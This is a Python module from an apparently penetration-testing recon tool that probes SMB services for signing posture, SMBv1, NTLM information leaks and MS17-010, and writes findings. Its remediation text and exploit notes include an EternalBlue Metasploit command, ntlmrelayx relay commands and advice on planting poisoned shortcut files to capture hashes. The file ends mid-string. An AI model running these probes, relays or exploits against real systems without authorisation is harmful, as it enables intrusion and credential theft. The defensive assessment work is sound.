"""Deep offensive SMB enumeration + vulnerability identification (stdlib core).

Modelled on recce/mssql.py. Two layers:

  * **Credential-free (airgapped, recce's own stdlib probes):** an SMB2 NEGOTIATE
    reveals the highest dialect and the *signing posture* (signing required vs
    merely enabled -> the NTLM-relay surface); a separate SMBv1 NEGOTIATE reveals
    whether the legacy SMBv1 protocol is still answered (the EternalBlue / MS17-010
    surface). No tools, no credentials - just crafted packets, like the TDS
    pre-login probe the MSSQL module uses.
  * **With tools / credentials:** null & guest session share enumeration (via
    `nxc smb` / `smbclient`), a reversible *writable-share* proof (drop a marker
    file, list it, delete it), and the credentialed runbook (shares / users /
    password policy / secretsdump / relay).

Everything positive becomes a finding that folds into the main severity totals,
the Vulnerabilities sheet, the write-ups, and a dedicated **SMB** workbook tab -
and each finding carries the exact existing-tool command to prove or abuse it.
Airgapped, stdlib only for the probe; the live layer shells out to the same
tools `credenum` already uses and degrades cleanly when they're absent.
"""
from __future__ import annotations

import re
import shlex
import socket
import struct

from ..core import proxy
from ..core.models import Host, Port
from .svccommon import finding_builder

_SMB_PORTS = (445, 139)
_DEFAULT_PORT = 445
_TIMEOUT = 6.0
_PROBE_MARK = "recce_smb_probe"

# SMB2 dialect revision -> human label.
_DIALECT = {
    0x0202: "SMB 2.0.2", 0x0210: "SMB 2.1", 0x0300: "SMB 3.0",
    0x0302: "SMB 3.0.2", 0x0311: "SMB 3.1.1", 0x02FF: "SMB 2.wildcard",
}
_SMB1_DIALECTS = [b"PC NETWORK PROGRAM 1.0", b"LANMAN1.0",
                  b"Windows for Workgroups 3.1a", b"LM1.2X002",
                  b"LANMAN2.1", b"NT LM 0.12"]


def is_smb(port: Port) -> bool:
    if not port.is_open:
        return False
    if port.portid in _SMB_PORTS:
        return True
    blob = f"{port.service} {port.product}".lower()
    return any(k in blob for k in ("microsoft-ds", "netbios-ssn", "smb", "samba"))


# --- credential-free wire probe (stdlib) ----------------------------------------

def _smb2_header(command: int, flags: int = 0) -> bytes:
    return (b"\xfeSMB"
            + struct.pack("<H", 64) + struct.pack("<H", 0) + struct.pack("<I", 0)
            + struct.pack("<H", command) + struct.pack("<H", 1)
            + struct.pack("<I", flags) + struct.pack("<I", 0)
            + struct.pack("<Q", 0) + struct.pack("<I", 0) + struct.pack("<I", 0)
            + struct.pack("<Q", 0) + b"\x00" * 16)


def _build_smb2_negotiate() -> bytes:
    # Offer 2.0.2 .. 3.0.2. We deliberately do NOT offer 3.1.1 (0x0311): it requires
    # negotiate contexts (preauth integrity) we don't build, so a 3.1.1-capable server
    # offered a bare 0x0311 would select it and reply STATUS_INVALID_PARAMETER. Every
    # such server also speaks 3.0.2, so it negotiates that instead and returns a valid
    # response we can read signing posture from.
    dialects = [0x0202, 0x0210, 0x0300, 0x0302]
    body = (struct.pack("<H", 36) + struct.pack("<H", len(dialects))
            + struct.pack("<H", 0x0001)          # SecurityMode: signing enabled
            + struct.pack("<H", 0) + struct.pack("<I", 0) + b"\x00" * 16
            + struct.pack("<I", 0) + struct.pack("<H", 0) + struct.pack("<H", 0)
            + b"".join(struct.pack("<H", d) for d in dialects))
    smb = _smb2_header(0x0000) + body
    return struct.pack(">I", len(smb)) + smb


def parse_smb2_negotiate(data: bytes) -> dict | None:
    """dialect + signing posture from an SMB2 NEGOTIATE response.

    Validates the SMB2 header before trusting the body: an *error* response (e.g.
    STATUS_INVALID_PARAMETER) or a non-NEGOTIATE reply would otherwise be read as a
    dialect-0 / signing-not-required host and emit a bogus 'signing not required'
    finding. Requires Command==NEGOTIATE(0), Status==SUCCESS, and StructureSize==65.
    """
    if not data or len(data) < 4 + 64 + 8:
        return None
    smb = data[4:]
    if smb[:4] != b"\xfeSMB":
        return None
    status = struct.unpack("<I", smb[8:12])[0]
    command = struct.unpack("<H", smb[12:14])[0]
    if command != 0x0000 or status != 0x00000000:
        return None                              # error / wrong command - not a NEGOTIATE OK
    body = smb[64:]
    if len(body) < 8 or struct.unpack("<H", body[0:2])[0] != 65:
        return None                              # NEGOTIATE response StructureSize is 65
    sec_mode = struct.unpack("<H", body[2:4])[0]
    dialect = struct.unpack("<H", body[4:6])[0]
    return {"dialect": dialect,
            "dialect_name": _DIALECT.get(dialect, f"0x{dialect:04x}"),
            "signing_enabled": bool(sec_mode & 0x01),
            "signing_required": bool(sec_mode & 0x02)}


# --- NTLMSSP CHALLENGE harvest (one extra credfree round-trip) ------------------

_NTLM_AV = {0x0001: "netbios_computer", 0x0002: "netbios_domain",
            0x0003: "dns_computer",     0x0004: "dns_domain",
            0x0005: "dns_tree"}
_SPNEGO_OID = b"\x06\x06\x2b\x06\x01\x05\x05\x02"
_NTLMSSP_OID = b"\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"


def _der_len(n: int) -> bytes:
    if n < 128:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _der_tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(value)) + value


def _spnego_neg_token_init(mech_token: bytes) -> bytes:
    """Wrap an NTLMSSP Type1 blob as a SPNEGO NegTokenInit for SMB2 SESSION_SETUP."""
    mech_types = _der_tlv(0x30, _NTLMSSP_OID)                        # SEQUENCE OF OID
    token = _der_tlv(0xA2, _der_tlv(0x04, mech_token))               # [2] OCTET STRING
    inner = _der_tlv(0x30, _der_tlv(0xA0, mech_types) + token)       # NegTokenInit SEQ
    return _der_tlv(0x60, _SPNEGO_OID + _der_tlv(0xA0, inner))       # [APP 0]


def _smb2_session_setup_header() -> bytes:
    return (b"\xfeSMB"
            + struct.pack("<H", 64) + struct.pack("<H", 0) + struct.pack("<I", 0)
            + struct.pack("<H", 0x0001) + struct.pack("<H", 1)
            + struct.pack("<I", 0) + struct.pack("<I", 0)
            + struct.pack("<Q", 1) + struct.pack("<I", 0) + struct.pack("<I", 0)
            + struct.pack("<Q", 0) + b"\x00" * 16)


def _build_smb2_session_setup(sec_buffer: bytes) -> bytes:
    body = (struct.pack("<H", 25)     # StructureSize (variable buffer follows)
            + b"\x00" + b"\x01"       # Flags, SecurityMode=SIGNING_ENABLED
            + struct.pack("<I", 0) + struct.pack("<I", 0)     # Capabilities, Channel
            + struct.pack("<H", 64 + 24)                      # SecurityBufferOffset
            + struct.pack("<H", len(sec_buffer))
            + struct.pack("<Q", 0)                            # PreviousSessionId
            + sec_buffer)
    smb = _smb2_session_setup_header() + body
    return struct.pack(">I", len(smb)) + smb


def parse_smb2_session_setup_response(data: bytes) -> dict | None:
    """Extract {status, session_flags, security_buffer} from an SMB2 SESSION_SETUP
    response. STATUS_MORE_PROCESSING_REQUIRED (0xC0000016) is the expected challenge
    stage; a plain 0 status also carries a valid buffer."""
    if not data or len(data) < 4 + 64 + 8:
        return None
    smb = data[4:]
    if smb[:4] != b"\xfeSMB":
        return None
    status = struct.unpack("<I", smb[8:12])[0]
    command = struct.unpack("<H", smb[12:14])[0]
    if command != 0x0001:
        return None
    body = smb[64:]
    if len(body) < 8 or struct.unpack("<H", body[0:2])[0] != 9:
        return None
    session_flags = struct.unpack("<H", body[2:4])[0]
    sec_off = struct.unpack("<H", body[4:6])[0]
    sec_len = struct.unpack("<H", body[6:8])[0]
    sec = data[4 + sec_off:4 + sec_off + sec_len] if sec_off and sec_len else b""
    return {"status": status, "session_flags": session_flags,
            "security_buffer": sec,
            "is_guest": bool(session_flags & 0x0001),
            "is_null": bool(session_flags & 0x0002)}


def parse_ntlm_challenge_info(sec_buffer: bytes) -> dict | None:
    """Parse an NTLMSSP CHALLENGE_MESSAGE (bare or SPNEGO-wrapped) into the info leak:
    NetBIOS + DNS computer/domain names, AD tree, server timestamp, OS build. Every
    field is optional -- present iff the server sent it."""
    from ..ad import ntlm
    base = ntlm.parse_type2(sec_buffer)
    if not base:
        return None
    out: dict = {"challenge": base["challenge"].hex(),
                 "ntlm_flags": base["flags"]}
    ti = base.get("target_info") or b""
    i, n = 0, len(ti)
    while i + 4 <= n:
        av_id, av_len = struct.unpack_from("<HH", ti, i)
        i += 4
        if av_id == 0x0000:
            break
        if i + av_len > n:
            break
        v = ti[i:i + av_len]
        if av_id in _NTLM_AV:
            out[_NTLM_AV[av_id]] = v.decode("utf-16-le", "replace")
        elif av_id == 0x0007 and av_len == 8:
            filetime = struct.unpack("<Q", v)[0]
            out["server_time_epoch"] = (filetime // 10_000_000) - 11_644_473_600
        i += av_len
    # OS version at bytes 48..56 of the CHALLENGE header, present iff NEGOTIATE_VERSION
    # (0x02000000) is set. Locate the NTLMSSP signature to skip any SPNEGO wrapper.
    idx = sec_buffer.find(b"NTLMSSP\x00")
    if idx >= 0 and idx + 56 <= len(sec_buffer) and (base["flags"] & 0x02000000):
        ver = sec_buffer[idx + 48:idx + 56]
        major, minor = ver[0], ver[1]
        build = struct.unpack("<H", ver[2:4])[0]
        if major or minor or build:
            out["os_version"] = f"{major}.{minor}.{build}"
            out["ntlm_revision"] = ver[7]
    return out


def probe_ntlm_info(ip: str, port: int = _DEFAULT_PORT,
                    timeout: float = _TIMEOUT) -> dict | None:
    """Credfree NTLMSSP CHALLENGE harvest. Opens one TCP session, runs NEGOTIATE then
    SESSION_SETUP with a SPNEGO(NTLMSSP Type1), and parses the returned CHALLENGE."""
    from ..ad import ntlm

    def _read_pdu(s):
        head = s.recv(4)
        if len(head) < 4:
            return None
        n = struct.unpack(">I", head)[0] & 0x00FFFFFF
        buf = b""
        while len(buf) < n:
            chunk = s.recv(min(4096, n - len(buf)))
            if not chunk:
                break
            buf += chunk
        return head + buf

    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(_build_smb2_negotiate())
            if not _read_pdu(s):
                return None
            sec = _spnego_neg_token_init(ntlm.type1())
            s.sendall(_build_smb2_session_setup(sec))
            data = _read_pdu(s)
            if not data:
                return None
            resp = parse_smb2_session_setup_response(data)
            if not resp or not resp.get("security_buffer"):
                return None
            info = parse_ntlm_challenge_info(resp["security_buffer"])
            if info is None:
                return None
            info["session_flags"] = resp["session_flags"]
            return info
    except OSError:
        return None


def _build_smb1_negotiate() -> bytes:
    header = (b"\xffSMB" + b"\x72" + b"\x00\x00\x00\x00" + b"\x18"
              + b"\x01\x28" + b"\x00\x00" + b"\x00" * 8 + b"\x00\x00"
              + b"\x00\x00" + b"\x2f\x4b" + b"\x00\x00" + b"\xc5\x5e")
    blob = b"".join(b"\x02" + d + b"\x00" for d in _SMB1_DIALECTS)
    body = b"\x00" + struct.pack("<H", len(blob)) + blob
    smb = header + body
    return struct.pack(">I", len(smb)) + smb


def parse_smb1_negotiate(data: bytes) -> dict:
    """True if the server answered SMBv1 with a selected dialect (SMBv1 enabled)."""
    if not data or len(data) < 4 + 35:
        return {"smbv1": False}
    smb = data[4:]
    if smb[:4] != b"\xffSMB" or smb[4] != 0x72 or smb[32] == 0:
        return {"smbv1": False}
    idx = struct.unpack("<H", smb[33:35])[0]
    if idx == 0xFFFF:
        return {"smbv1": False}
    return {"smbv1": True, "dialect_index": idx}


def _exchange(ip: str, port: int, payload: bytes, timeout: float) -> bytes | None:
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(payload)
            head = s.recv(4)
            if len(head) < 4:
                return None
            n = struct.unpack(">I", head)[0] & 0x00FFFFFF
            buf = b""
            while len(buf) < n and len(buf) < 65535:
                chunk = s.recv(min(4096, n - len(buf)))
                if not chunk:
                    break
                buf += chunk
            return head + buf
    except OSError:
        return None


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict | None:
    """Credential-free SMB posture: dialect, signing, whether SMBv1 is enabled.
    Returns None only if the host answered neither SMB2 nor SMB1."""
    r2 = _exchange(ip, port, _build_smb2_negotiate(), timeout)
    neg = parse_smb2_negotiate(r2)
    r1 = _exchange(ip, port, _build_smb1_negotiate(), timeout)
    v1 = parse_smb1_negotiate(r1)
    if neg is None and not v1.get("smbv1"):
        return None
    out = {"ip": ip, "port": port, "smbv1": bool(v1.get("smbv1"))}
    if neg:
        out.update(neg)
    return out


# --- MS17-010 (EternalBlue) wire signature probe --------------------------------
#
# T2 promotion for the SMBv1-enabled finding: after we know SMBv1 answers, replay
# the exact SMB_COM_TRANSACTION PeekNamedPipe(FID=0) probe that nmap NSE
# `smb-vuln-ms17-010` uses to distinguish patched vs vulnerable, without ever
# invoking the SMBv1 heap-overflow itself. Real server-side evidence (the NT
# status of a single request), one TCP session, no writes, no state change.
#
# The transaction handler on an unpatched SMBv1 server returns
#     STATUS_INSUFF_SERVER_RESOURCES (0xC0000205)  -> VULNERABLE (MS17-010 unpatched)
# The KB4013389 hardening rewrote the branch to reject the invalid FID cleanly:
#     STATUS_INVALID_HANDLE          (0xC0000008)  -> PATCHED
#
_MS17_VULN_STATUS = 0xC0000205        # STATUS_INSUFF_SERVER_RESOURCES
_MS17_PATCHED_STATUS = 0xC0000008     # STATUS_INVALID_HANDLE


def _smb1_hdr(cmd: int, flags2: int = 0xC843,
              tid: int = 0, uid: int = 0, mid: int = 0,
              pid: int = 0xFEFF) -> bytes:
    """Build a 32-byte SMB1 header. Flags2=0xC843 sets Unicode|NT_STATUS|Long_names
    |Ext_security — the ordinary Windows client baseline."""
    return (b"\xffSMB"
            + bytes([cmd])
            + b"\x00\x00\x00\x00"                       # NT Status (client-side 0)
            + b"\x18"                                    # Flags: canonical paths, ci
            + struct.pack("<H", flags2)
            + b"\x00\x00"                                # PIDHigh
            + b"\x00" * 8                                # Signature
            + b"\x00\x00"                                # Reserved
            + struct.pack("<HHHH", tid, pid, uid, mid))


def _ms17_negotiate() -> bytes:
    """SMB1 NEGOTIATE offering only NT LM 0.12 — the dialect MS17-010 attacks."""
    hdr = _smb1_hdr(0x72, mid=0)
    dialects = b"\x02NT LM 0.12\x00"
    body = bytes([0]) + struct.pack("<H", len(dialects)) + dialects   # wct=0
    smb = hdr + body
    return struct.pack(">I", len(smb)) + smb


def _ms17_session_setup() -> bytes:
    """SMB1 SESSION_SETUP_ANDX (null session — empty user, empty password, empty domain).
    Word count 13, no AndX chain, no OEM/Unicode password bytes."""
    hdr = _smb1_hdr(0x73, mid=1)
    words = struct.pack("<BBHHHHIHHII",
                        0xFF, 0,        # AndX cmd (none), reserved
                        0,              # AndX offset
                        4356,           # MaxBufferSize
                        10, 1,          # MaxMpxCount, VcNumber
                        0,              # SessionKey
                        0, 0,           # OEMPasswordLen, UnicodePasswordLen
                        0,              # Reserved
                        0)              # Capabilities
    # Header(32) + WCT(1) + Words(26) = 59; ByteCount at 59; payload starts at 61 (odd)
    # so pad one byte before the unicode string block.
    pad = b"\x00"
    account = "\x00".encode("utf-16-le")     # empty username, unicode-terminated
    domain = "\x00".encode("utf-16-le")
    native_os = "recce\x00".encode("utf-16-le")
    native_lm = "recce\x00".encode("utf-16-le")
    bcc = pad + account + domain + native_os + native_lm
    body = bytes([13]) + words + struct.pack("<H", len(bcc)) + bcc
    smb = hdr + body
    return struct.pack(">I", len(smb)) + smb


def _ms17_tree_connect(uid: int, ip: str) -> bytes:
    """SMB1 TREE_CONNECT_ANDX to \\\\<ip>\\IPC$ (unicode path, service '?????' ANSI)."""
    hdr = _smb1_hdr(0x75, uid=uid, mid=2)
    words = struct.pack("<BBHHH",
                        0xFF, 0, 0,     # AndX cmd, reserved, offset
                        0,              # Flags
                        1)              # PasswordLength (1 empty byte follows)
    password = b"\x00"
    # Header(32)+WCT(1)+Words(8)+BCC(2)+Password(1) = 44 (even) — path is aligned.
    path_uni = (f"\\\\{ip}\\IPC$" + "\x00").encode("utf-16-le")
    service = b"?????\x00"
    bcc = password + path_uni + service
    body = bytes([4]) + words + struct.pack("<H", len(bcc)) + bcc
    smb = hdr + body
    return struct.pack(">I", len(smb)) + smb


def _ms17_trans_peek(uid: int, tid: int) -> bytes:
    """SMB1 SMB_COM_TRANSACTION whose Setup[0]=PeekNamedPipe(0x23), Setup[1]=FID=0
    (deliberately invalid). Word count 16 = 14 fixed words + 2 setup words."""
    hdr = _smb1_hdr(0x25, tid=tid, uid=uid, mid=3)
    words = struct.pack("<HHHHBBHIHHHHHBB",
                        0,              # TotalParameterCount
                        0,              # TotalDataCount
                        0,              # MaxParameterCount
                        0xFFFF,         # MaxDataCount
                        0, 0,           # MaxSetupCount, Reserved
                        0,              # Flags
                        0,              # Timeout
                        0,              # Reserved2
                        0, 0,           # ParameterCount, ParameterOffset
                        0, 0,           # DataCount, DataOffset
                        2, 0)           # SetupCount=2, Reserved3
    setup = struct.pack("<HH", 0x0023, 0x0000)     # PeekNamedPipe, invalid FID
    name = b"\\PIPE\\\x00"                          # ASCII pipe name
    body = bytes([16]) + words + setup + struct.pack("<H", len(name)) + name
    smb = hdr + body
    return struct.pack(">I", len(smb)) + smb


def _parse_smb1_status(data: bytes) -> tuple[int, int, int] | None:
    """Return (nt_status, uid, tid) from an SMB1 response, or None on shape mismatch."""
    if not data or len(data) < 4 + 32:
        return None
    smb = data[4:]
    if smb[:4] != b"\xffSMB":
        return None
    status = struct.unpack("<I", smb[5:9])[0]
    tid = struct.unpack("<H", smb[24:26])[0]
    uid = struct.unpack("<H", smb[28:30])[0]
    return status, uid, tid


def _read_pdu_nb(sock) -> bytes | None:
    """Read one NetBIOS-framed SMB PDU (4-byte length prefix + payload)."""
    head = sock.recv(4)
    if len(head) < 4:
        return None
    n = struct.unpack(">I", head)[0] & 0x00FFFFFF
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(min(4096, n - len(buf)))
        if not chunk:
            break
        buf += chunk
    return head + buf


def probe_ms17_010(ip: str, port: int = _DEFAULT_PORT,
                   timeout: float = _TIMEOUT) -> dict | None:
    """MS17-010 non-destructive wire check: NEG -> SESSION_SETUP (null) -> TREE
    IPC$ -> TRANS PeekNamedPipe(FID=0). The final NT status is the differentiator.
    Returns {vulnerable, status, status_label, phase, evidence} — vulnerable is True
    (STATUS_INSUFF_SERVER_RESOURCES), False (STATUS_INVALID_HANDLE), or None (any
    other status: the probe cannot decide). One TCP session, no writes, no exploit."""
    t = proxy.scaled(timeout)
    try:
        with socket.create_connection((ip, port), timeout=t) as s:
            s.settimeout(t)
            s.sendall(_ms17_negotiate())
            neg = _read_pdu_nb(s)
            if not neg or len(neg) < 4 + 32 or neg[4:8] != b"\xffSMB":
                return None
            s.sendall(_ms17_session_setup())
            sess = _read_pdu_nb(s)
            r = _parse_smb1_status(sess) if sess else None
            if not r:
                return None
            sess_status, uid, _ = r
            if sess_status & 0xC0000000:
                return {"vulnerable": None, "status": sess_status,
                        "status_label": f"0x{sess_status:08x}",
                        "phase": "session_setup",
                        "evidence": f"null-session SESSION_SETUP refused "
                                    f"(status=0x{sess_status:08x}); cannot reach"
                                    f" the MS17-010 transaction path without a UID."}
            s.sendall(_ms17_tree_connect(uid, ip))
            tc = _read_pdu_nb(s)
            r = _parse_smb1_status(tc) if tc else None
            if not r:
                return None
            tc_status, _, tid = r
            if tc_status & 0xC0000000:
                return {"vulnerable": None, "status": tc_status,
                        "status_label": f"0x{tc_status:08x}",
                        "phase": "tree_connect",
                        "evidence": f"TREE_CONNECT to \\\\{ip}\\IPC$ refused "
                                    f"(status=0x{tc_status:08x}); MS17-010 differentiator"
                                    f" not reachable over null session."}
            s.sendall(_ms17_trans_peek(uid, tid))
            tr = _read_pdu_nb(s)
            r = _parse_smb1_status(tr) if tr else None
            if not r:
                return None
            tr_status, _, _ = r
            if tr_status == _MS17_VULN_STATUS:
                vuln, label = True, "STATUS_INSUFF_SERVER_RESOURCES"
            elif tr_status == _MS17_PATCHED_STATUS:
                vuln, label = False, "STATUS_INVALID_HANDLE"
            else:
                vuln, label = None, f"UNKNOWN(0x{tr_status:08x})"
            ev = (f"SMB1 SMB_COM_TRANSACTION PeekNamedPipe(FID=0) on "
                  f"\\\\{ip}\\IPC$ returned {label} (0x{tr_status:08x}). "
                  f"nmap smb-vuln-ms17-010 differentiator: "
                  f"STATUS_INSUFF_SERVER_RESOURCES=vulnerable, "
                  f"STATUS_INVALID_HANDLE=patched.")
            return {"vulnerable": vuln, "status": tr_status,
                    "status_label": label, "phase": "trans", "evidence": ev}
    except OSError:
        return None


def smb_targets(hosts: list[Host]) -> list[dict]:
    """One row per open SMB port across the given hosts."""
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_smb(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "product": p.product or "", "version": p.version or ""})
    return out


# --- narratives -----------------------------------------------------------------

_NARRATIVE = {
    "smbv1": (
        "SMBv1 is a 30-year-old file-sharing protocol Microsoft deprecated and now "
        "disables by default. A server that still answers it exposes the exact "
        "surface of MS17-010 / EternalBlue (CVE-2017-0143/0144 - the wormable RCE "
        "behind WannaCry and NotPetya): a heap-overflow in the SMBv1 transaction "
        "handler that yields SYSTEM-level remote code execution pre-authentication. "
        "SMBv1 also has no support for signing or encryption and negotiates the "
        "weak NTLMv1 flows, so it enables downgrade and relay attacks even when it "
        "isn't the EternalBlue-vulnerable build. Its mere presence is a critical "
        "hardening failure; confirm the patch level with the non-intrusive "
        "smb-vuln-ms17-010 NSE check to separate 'legacy protocol on' from "
        "'remotely exploitable today'."),
    "smb_signing_not_required": (
        "SMB message signing that is 'not required' means the server will accept an "
        "unsigned session - the precondition for an NTLM relay TO this host. An "
        "attacker who coerces authentication from a privileged account (PetitPotam / "
        "PrinterBug / a poisoned LLMNR/NBNS/mDNS response captured by Responder) "
        "relays that NetNTLM authentication straight to this machine over SMB with "
        "ntlmrelayx and acts AS the victim: dump the SAM, run secretsdump, execute a "
        "command, or (if the victim is a Domain Admin / the machine account of a DC) "
        "escalate to full domain compromise. Where the relayed account is a local "
        "admin, it is instant remote code execution as SYSTEM. Domain Controllers "
        "require signing by default - a member server or workstation that does not "
        "is the classic relay landing spot."),
    "null_session": (
        "A null / anonymous session is an unauthenticated SMB logon (empty username "
        "and password) that the server nonetheless honours. It leaks the domain SID, "
        "the full user and group list (feeding password-spray target lists and "
        "AS-REP/Kerberoast candidate discovery), the password policy (so you spray "
        "without tripping lockout), the machine and share inventory, and often the "
        "contents of world-readable shares. It is reconnaissance gold and frequently "
        "the first foothold: enum4linux-ng / rpcclient / nxc all pivot from it."),
    "guest": (
        "The guest account is enabled and maps unauthenticated or unknown logons to "
        "a real, if low-privileged, session. That turns 'access denied' into 'access "
        "granted' for share reads and RPC enumeration without any credential, and on "
        "misconfigured hosts guest can reach shares that hold scripts, backups or "
        "credentials."),
    "readable_share": (
        "A non-administrative share is readable without valid credentials (null / "
        "guest). Open shares routinely hold deployment scripts, configuration files "
        "with embedded passwords, database backups, private keys, and user home "
        "directories - the raw material for the next hop. Everything here is "
        "exfiltratable with a single smbclient / smbget."),
    "smb_ntlm_info_disclosure": (
        "SMB2 SESSION_SETUP with an NTLMSSP NEGOTIATE_MESSAGE forces the server to "
        "return a CHALLENGE_MESSAGE whose TargetInfo AV_PAIR list leaks the machine's "
        "NetBIOS and DNS names, the AD domain and forest, the exact OS build (directly "
        "maps to missing-patch CVE queries), and the authoritative server clock "
        "(Kerberos skew tolerance). Pre-authentication, credential-free, and hard to "
        "disable on a Windows box that still accepts NTLM - this is the highest-value "
        "single-packet intel SMB gives away for free and feeds host/domain identity "
        "for the rest of the engagement."),
    "writable_share": (
        "A share is WRITABLE without administrative credentials. Beyond planting a "
        "web shell where a share backs a web root, a writable share enables passive "
        "credential theft: drop a poisoned .SCF, .URL, .LNK, or desktop.ini that "
        "points its icon at a UNC path on your host, and any user who browses the "
        "folder in Explorer silently authenticates to you - capture the NetNTLM hash "
        "with Responder and crack or relay it. Writable network shares are also a "
        "common ransomware and lateral-movement vector. recce proves the write is "
        "real by dropping a harmless marker, listing it, and immediately deleting it "
        "again (fully reversible)."),
}


TESTING_NARRATIVE = [
    ("1. Credential-free posture (stdlib)",
     "recce sends an SMB2 NEGOTIATE and reads the highest dialect and the signing "
     "posture (required vs merely enabled), then sends an SMBv1 NEGOTIATE to see "
     "whether the legacy protocol is still answered. No tools, no credentials - the "
     "signing and SMBv1 states are directly observed, not inferred from a banner."),
    ("2. Vulnerability identification",
     "SMBv1 answered -> the MS17-010 / EternalBlue surface (critical). Signing not "
     "required -> the NTLM-relay surface. These fold into the main severity totals "
     "and the prove engine adjudicates each from the observed state."),
    ("3. Anonymous enumeration",
     "With nxc / smbclient, recce tries a null and guest session and enumerates the "
     "share, user and password-policy inventory an anonymous logon leaks - the "
     "reconnaissance an attacker gets before holding any credential."),
    ("4. Access + write proof",
     "For each reachable share recce records READ/WRITE ACLs, and for a writable "
     "share it PROVES the write reversibly: drop a marker file, list it, delete it. "
     "A confirmed write is a CONFIRMED finding with the terminal transcript as "
     "proof - the material for a technical walkthrough screenshot."),
    ("5. Credentialed runbook",
     "Given credentials, recce stages the full enumeration (shares / users / "
     "sessions / logged-on / password policy), secretsdump where the account is "
     "admin, and the relay chain where signing is off - each command pre-filled."),
]


# --- findings -------------------------------------------------------------------

_finding = finding_builder("smb", _NARRATIVE)


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    """Offline SMB findings from the stdlib probe + any NSE scripts already on the
    port. `probes` is {(ip,port): probe_dict} from analyze(); when absent only the
    NSE-derived findings are produced."""
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_smb(p):
                continue
            tgt = f"{h.ip}:{p.portid}"
            pr = probes.get((h.ip, p.portid))
            if pr and pr.get("smbv1"):
                # T2 promotion: PeekNamedPipe(FID=0) wire signature from
                # nmap smb-vuln-ms17-010. Bumps depth_tier to t2 whenever the
                # differentiator NT status came back decisive (vulnerable OR
                # patched — both are real server-side evidence). A vulnerable
                # verdict also lifts severity to CRITICAL since remote-SYSTEM
                # RCE is a KB4013389-away, not tester-follow-up territory.
                ms17 = (pr or {}).get("ms17_010") or {}
                v = ms17.get("vulnerable")
                if v is True:
                    sev = "critical"
                    title = ("SMBv1 EternalBlue / MS17-010 VULNERABLE "
                             "(STATUS_INSUFF_SERVER_RESOURCES observed)")
                    tier = "t2"
                    extra = ("\n\nT2 wire evidence: " + ms17.get("evidence", ""))
                elif v is False:
                    sev = "high"
                    title = ("SMBv1 enabled but MS17-010 patched "
                             "(STATUS_INVALID_HANDLE observed)")
                    tier = "t2"
                    extra = ("\n\nT2 wire evidence: " + ms17.get("evidence", "")
                             + " Legacy protocol is still a hardening failure "
                               "(no signing, downgrade/relay surface) even though "
                               "the EternalBlue heap-overflow branch is fixed.")
                else:
                    sev = "high"
                    title = ("SMBv1 (legacy protocol) enabled - "
                             "EternalBlue/MS17-010 surface")
                    tier = "t1"
                    extra = ""
                    if ms17.get("evidence"):
                        extra = ("\n\nMS17-010 differentiator probe did not "
                                 "reach a decisive verdict: "
                                 + ms17["evidence"])
                out.append(_finding(
                    sev, title, tgt,
                    "The host answered an SMBv1 NEGOTIATE with a selected dialect - the "
                    "deprecated SMBv1 protocol is still enabled (directly observed, not a "
                    "banner guess). This is the MS17-010 / EternalBlue attack surface."
                    + extra,
                    "nmap",
                    "nmap --script smb-vuln-ms17-010 -p445 <ip>   # non-intrusive: "
                    "VULNERABLE = remotely exploitable now, NOT VULNERABLE = legacy proto "
                    "on but patched",
                    "Disable SMBv1 entirely (Windows: Remove-WindowsFeature FS-SMB1 / "
                    "registry SMB1=0; Samba: 'server min protocol = SMB2_10').",
                    ["CWE-1104", "CWE-477"], kind="smbv1",
                    exploit_note=(
                        "nmap --script smb-vuln-ms17-010 -p445 <ip>. If VULNERABLE: "
                        "msf use exploit/windows/smb/ms17_010_eternalblue set RHOSTS "
                        "<ip>; LHOST <you>; check first, exploit only in ROE."),
                    depth_tier=tier))
            # SMB signing is TWO independent flags in the SMB2 NEGOTIATE
            # SecurityMode byte, and conflating them is the difference between
            # "the server can sign if the client asks" and "the server refuses
            # a client that will not sign". nxc reports the boolean and calls it
            # "signing enabled" — a host in that state is still a relay target,
            # which is why a report that just says "signing enabled" repeatedly
            # under-reports the exposure.
            #
            #   0x01 SIGN_ENABLED   — signing is available
            #   0x02 SIGN_REQUIRED  — signing is mandatory (this is the fix)
            #
            # NOT REQUIRED is the actual relay-target condition. Split so the
            # finding is unambiguous about which flag we observed.
            enabled = pr and pr.get("signing_enabled")
            required = pr and pr.get("signing_required")
            if pr and required is False:
                sub_state = ("advertises signing as *available* but not *required*"
                             if enabled else
                             "does not offer signing at all (neither enabled nor required)")
                out.append(_finding(
                    "medium",
                    "SMB signing not required (NTLM relay target)", tgt,
                    f"The SMB2 NEGOTIATE SecurityMode byte {sub_state} "
                    f"on {pr.get('dialect_name', '?')} — SIGN_ENABLED="
                    f"{bool(enabled)}, SIGN_REQUIRED=False. Directly observed. "
                    "This host will accept a relayed NTLM authentication, so a "
                    "coerced/poisoned login (PetitPotam / Responder / DFSCoerce) "
                    "can be replayed here to act as the victim. The distinction "
                    "matters: 'enabled but not required' is a common reporting "
                    "false-clean because signing IS available — the server just "
                    "will not enforce it, so an attacker's relayed session works.",
                    "impacket / nxc",
                    "nxc smb <ip> --gen-relay-list relays.txt ; "
                    "ntlmrelayx.py -t smb://<ip> -smb2support   # relay a coerced login "
                    "(PetitPotam/Responder) in ROE",
                    "Require SMB signing (GPO: 'Microsoft network server: Digitally sign "
                    "communications (always)' = Enabled; Samba: 'server signing = mandatory'). "
                    "For client-side, set 'Microsoft network client: Digitally sign "
                    "communications (always)' too — the client-side flag is what stops "
                    "reflection-relay variants that target the initiator side of the "
                    "SMB conversation.",
                    ["CWE-287", "CWE-319"], kind="smb_signing_not_required",
                    exploit_note=(
                        "impacket-ntlmrelayx.py -t smb://<ip> -smb2support -socks & then "
